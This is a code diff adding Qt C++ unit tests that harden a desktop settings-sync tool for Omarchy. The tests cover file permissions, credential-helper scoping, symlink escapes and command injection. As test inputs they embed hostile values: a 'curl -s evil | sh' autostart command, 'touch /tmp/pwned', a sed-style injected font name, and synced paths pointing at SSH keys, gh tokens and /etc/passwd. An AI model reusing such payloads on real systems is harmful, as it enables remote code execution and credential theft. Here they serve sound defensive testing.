@@ -12,6 +12,8 @@
 #include <QTemporaryDir>
 #include <QtTest>
 
+#include <sys/stat.h>
+
 #include "backend.h"
 #include "hyprconf.h"
 #include "monitorlayout.h"
@@ -1090,7 +1092,7 @@ private slots:
         Store store(p, sys.exec());
         QDir().mkpath(store.syncDir() + "/.git");
         writeText(store.syncStatePath(), "{\"url\":\"https://github.com/me/omarchy-sync\",\"branch\":\"main\",\"lastCommit\":\"aaa\"}");
-        sys.answer("git -C " + store.syncDir() + " rev-parse --verify --quiet refs/remotes/origin/main", "bbb\n");
+        sys.answer("git -C " + store.syncDir() + " -c core.symlinks=false rev-parse --verify --quiet refs/remotes/origin/main", "bbb\n");
 
         QCOMPARE(store.act("sync.upload", {"auto"}), QString());
         QVERIFY(store.act("sync.upload", {""}).contains("newer settings"));
@@ -1139,6 +1141,134 @@ private slots:
         FakeSystem sys;
         Store store(p, sys.exec());
         QCOMPARE(mode(store.syncDir()), ownerOnly);
+    }
+
+    void syncRestoresNewFilesOnlyOpenToYou() {
+        const mode_t umaskWas = umask(022);
+        QTemporaryDir dir;
+        FakeSystem sys;
+        Paths p = pathsIn(dir);
+        p.data = dir.path() + "/data";
+        Store store(p, sys.exec());
+        sys.answer("git -C " + store.syncDir() + " -c core.symlinks=false rev-parse --verify --quiet refs/remotes/origin/main", "bbb\n");
+        writeText(store.syncStatePath(), "{\"url\":\"https://github.com/me/omarchy-sync\",\"branch\":\"main\"}");
+        const QString repo = store.syncDir();
+        writeText(repo + "/dotfiles/.config/tool/api-key", "secret");
+        writeText(repo + "/dotfiles/.local/bin/hello", "#!/bin/sh\n");
+        QFile::setPermissions(repo + "/dotfiles/.local/bin/hello", QFile::permissions(repo + "/dotfiles/.local/bin/hello") | QFileDevice::ExeOwner);
+        writeText(repo + "/dotfiles/.zshrc", "new");
+        writeText(repo + "/hypr/bindings.lua", "-- theirs");
+        writeText(repo + "/dotfiles.json", "[\".config/tool/api-key\",\".local/bin/hello\",\".zshrc\"]");
+        // A file already here keeps its permissions.
+        writeText(p.home + "/.zshrc", "old");
+        const QFileDevice::Permissions zshrcWas = QFile::permissions(p.home + "/.zshrc");
+
+        QCOMPARE(store.act("sync.apply", {}), QString());
+        umask(umaskWas);
+        auto mode = [](const QString &path) {
+            return QFileInfo(path).permissions() & ~(QFileDevice::ReadUser | QFileDevice::WriteUser | QFileDevice::ExeUser);
+        };
+        QCOMPARE(readText(p.home + "/.config/tool/api-key"), QString("secret"));
+        QCOMPARE(mode(p.home + "/.config/tool/api-key"), QFileDevice::ReadOwner | QFileDevice::WriteOwner);
+        QCOMPARE(mode(p.home + "/.local/bin/hello"), QFileDevice::ReadOwner | QFileDevice::WriteOwner | QFileDevice::ExeOwner);
+        QCOMPARE(mode(p.config + "/hypr/bindings.lua"), QFileDevice::ReadOwner | QFileDevice::WriteOwner);
+        QCOMPARE(readText(p.home + "/.zshrc"), QString("new"));
+        QCOMPARE(QFile::permissions(p.home + "/.zshrc"), zshrcWas);
+    }
+
+    void syncOnlySignsInToGitHubWithGh() {
+        if (QStandardPaths::findExecutable("gh").isEmpty())
+            QSKIP("gh isn't installed");
+        QTemporaryDir dir;
+        FakeSystem sys;
+        Paths p = pathsIn(dir);
+        p.data = dir.path() + "/data";
+        const Exec fake = sys.exec();
+        const QString syncDir = p.data + "/omasettings/sync";
+        Store store(p, [&](const QString &program, const QStringList &args, int t, const QByteArray &in) {
+            if (args.contains("clone"))
+                QDir().mkpath(syncDir + "/.git");
+            return fake(program, args, t, in);
+        });
+        QCOMPARE(store.act("sync.connect", {"https://git.example.com/me/omarchy-sync"}), QString());
+        writeText(store.syncStatePath(), "{\"url\":\"https://git.example.com/me/omarchy-sync\",\"branch\":\"main\"}");
+        store.act("sync.apply", {});
+        int signedIn = 0;
+        for (const QString &call : sys.calls) {
+            // gh, which would answer any host with GH_ENTERPRISE_TOKEN, is
+            // only asked about github.com.
+            QVERIFY2(!call.contains("credential.helper=!"), qPrintable(call));
+            if (call.contains("credential.https://github.com.helper=!"))
+                ++signedIn;
+        }
+        QVERIFY(signedIn >= 2);
+    }
+
+    void aRepositoryCantReachOutsideItself() {
+        QTemporaryDir dir;
+        FakeSystem sys;
+        Paths p = pathsIn(dir);
+        p.data = dir.path() + "/data";
+        Store store(p, sys.exec());
+        sys.answer("git -C " + store.syncDir() + " -c core.symlinks=false rev-parse --verify --quiet refs/remotes/origin/main", "bbb\n");
+        writeText(store.syncStatePath(), "{\"url\":\"https://github.com/me/omarchy-sync\",\"branch\":\"main\",\"lastCommit\":\"bbb\"}");
+        const QString repo = store.syncDir();
+        QDir().mkpath(repo + "/.git");
+        writeText(p.home + "/precious.txt", "mine");
+        writeText(p.home + "/.ssh/id_ed25519", "key");
+        writeText(p.home + "/.config/gh/hosts.yml", "token");
+        // A linked part, a linked file, and paths to keys, all from the repository.
+        QVERIFY(QFile::link(p.home, repo + "/dotfiles"));
+        QDir().mkpath(repo + "/hypr");
+        QVERIFY(QFile::link(p.home + "/.ssh/id_ed25519", repo + "/hypr/x.conf"));
+        writeText(repo + "/dotfiles.json", "[\".ssh/id_ed25519\", \".config/gh\", \".\", \"../outside\", \"/etc/passwd\", \".config/nvim\"]");
+
+        // Every link in the local copy is gone, and only what this computer
+        // could add itself is listed for upload.
+        const QVariantMap plan = store.syncPlan();
+        QCOMPARE(plan.value("dotfilesAdded").toStringList(), QStringList{".config/nvim"});
+        QCOMPARE(store.act("sync.apply", {"bbb"}), QString());
+        QVERIFY(!QFileInfo(repo + "/dotfiles").isSymLink());
+        QVERIFY(!QFileInfo::exists(repo + "/hypr/x.conf"));
+        QVERIFY(!QFileInfo::exists(p.config + "/hypr/x.conf"));
+        const QJsonObject state = QJsonDocument::fromJson(readText(store.syncStatePath()).toUtf8()).object();
+        QCOMPARE(state.value("dotfiles").toArray(), QJsonArray{".config/nvim"});
+
+        // An upload empties the parts of the local copy, never their targets.
+        QVERIFY(QFile::link(p.home, repo + "/dotfiles"));
+        store.writeSyncSnapshot(repo, {}, {".ssh/id_ed25519", ".config/gh/hosts.yml"});
+        QCOMPARE(readText(p.home + "/precious.txt"), QString("mine"));
+        QVERIFY(!QFileInfo::exists(repo + "/dotfiles/.ssh/id_ed25519"));
+        QVERIFY(!QFileInfo::exists(repo + "/dotfiles/.config/gh/hosts.yml"));
+
+        // What the confirmation showed is what is applied.
+        QVERIFY(store.act("sync.apply", {"aaa"}).contains("changed since"));
+    }
+
+    void importedSettingsCantAddCommandsUnseen() {
+        QTemporaryDir dir;
+        FakeSystem sys;
+        Store store(pathsIn(dir), sys.exec());
+        const QJsonObject doc{{"app", "omasettings"}, {"managed", QJsonObject{
+            {"autostart", QJsonArray{QJsonObject{{"command", "curl -s evil | sh"}}}},
+            {"bindings", QJsonArray{QJsonObject{{"keys", "SUPER + RETURN"}, {"kind", "command"}, {"value", "evil"}},
+                                    QJsonObject{{"keys", "SUPER + B"}, {"kind", "launch"}, {"value", "firefox"}},
+                                    QJsonObject{{"keys", "nonsense"}, {"kind", "launch"}, {"value", "x"}}}},
+            {"menuWhen", QJsonObject{{"x", "touch /tmp/pwned"}}},
+            {"hypr", QJsonObject{{"exec-once", "evil"}}}}}};
+        const QString path = dir.path() + "/shared.json";
+        writeText(path, QJsonDocument(doc).toJson());
+        const QString result = store.act("settings.import", {path});
+        QVERIFY(result.contains("curl -s evil | sh"));
+        QVERIFY(result.contains("evil"));
+        const QString text = QString::fromUtf8(QJsonDocument(store.managedState()).toJson());
+        QVERIFY2(!text.contains("evil") && !text.contains("pwned") && !text.contains("nonsense"), qPrintable(text));
+        QVERIFY(text.contains("firefox"));
+
+        // Sync, whose confirmation lists each command, adds them.
+        QCOMPARE(store.importSettings(doc, true), QString());
+        QVERIFY(QString::fromUtf8(QJsonDocument(store.managedState()).toJson()).contains("curl -s evil | sh"));
+        QVERIFY(!QString::fromUtf8(QJsonDocument(store.managedState()).toJson()).contains("pwned"));
     }
 
     void syncPlanOnlyAddsWhatIsMissing() {
@@ -1218,6 +1348,21 @@ private slots:
         QCOMPARE(store.terminalCommand("sudoPasswordlessOff"), (QStringList{"omarchy-sudo-passwordless", "--disable"}));
         QVERIFY(store.terminalCommand("rm").isEmpty());
         QVERIFY(store.act("launch", {"kernel:evil"}).contains("Unknown command"));
+    }
+
+    void onlyPlainFontNamesReachOmarchy() {
+        QTemporaryDir dir;
+        FakeSystem sys;
+        sys.answer("omarchy-font-list", "JetBrainsMono Nerd Font\nCaskaydiaMono Nerd Font Mono\nEvil/g;1e touch /tmp/x;#\nx\" & <b>\n");
+        Store store(pathsIn(dir), sys.exec());
+        QCOMPARE(store.list("fonts").toList(), (QVariantList{"JetBrainsMono Nerd Font", "CaskaydiaMono Nerd Font Mono"}));
+        QCOMPARE(store.write("appearance.font", "JetBrainsMono Nerd Font"), QString());
+        QVERIFY(sys.calls.contains("omarchy-font-set JetBrainsMono Nerd Font"));
+        for (const char *evil : {"Evil/g;1e touch /tmp/x;#", "Mono\" & echo", "-h", "Mono\nfont=x", "<b>Mono", "Mono:size=99", " Mono"}) {
+            QVERIFY2(!store.write("appearance.font", QString::fromUtf8(evil)).isEmpty(), evil);
+            for (const QString &call : sys.calls)
+                QVERIFY2(call == "omarchy-font-set JetBrainsMono Nerd Font" || !call.startsWith("omarchy-font-set"), qPrintable(call));
+        }
     }
 
     void gitIdentityGoesThroughOmarchy() {
@@ -1778,7 +1923,7 @@ private slots:
 
         command.clear();
         QCOMPARE(store.softwareCommand("software.drop", "terminal.foot", command), QString());
-        QCOMPARE(command, (QStringList{"omarchy-launch-floating-terminal-with-presentation", "omarchy-pkg-drop foot"}));
+        QCOMPARE(command, (QStringList{"omarchy-launch-floating-terminal-with-presentation", "omarchy-pkg-drop 'foot'"}));
         // Not one the menu can remove itself, and never the terminal in use.
         QVERIFY(!store.softwareCommand("software.drop", "browser.zen", command).isEmpty());
         QVERIFY(!store.softwareCommand("software.drop", "nope", command).isEmpty());
